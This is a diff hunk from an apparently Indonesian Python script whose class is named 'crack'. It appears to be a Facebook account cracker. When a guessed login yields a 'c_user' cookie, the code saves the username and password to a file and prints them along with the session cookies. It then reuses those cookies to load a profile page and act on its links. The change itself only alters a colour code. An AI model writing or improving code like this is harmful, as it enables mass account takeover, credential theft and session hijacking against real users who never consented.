@@ -95,7 +95,7 @@ class crack:
 			if 'c_user' in d.cookies.get_dict().keys():
 				ok+=1
 				open('ok','a').write(user+' '+pw+'\n')
-				print(f'\r\33[32;1m(√) TIDAK CHECKPOINT (✓)\n(+) USER\t: {user}                         \nPASS\t: {pw}                         \nCOOKIES\t: {"".join(d.cookies.get_dict())}\n-------------------------------------------\33[37;1m                     \n',end='')
+				print(f'\033[1;96m(√) TIDAK CHECKPOINT (✓)\n(+) USER\t: {user}                         \nPASS\t: {pw}                         \nCOOKIES\t: {"".join(d.cookies.get_dict())}\n-------------------------------------------\33[37;1m                     \n',end='')
 				coki={"cookie":"".join(d.cookies.get_dict())}
 				r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
 				for fllow in r.find_all("a"):
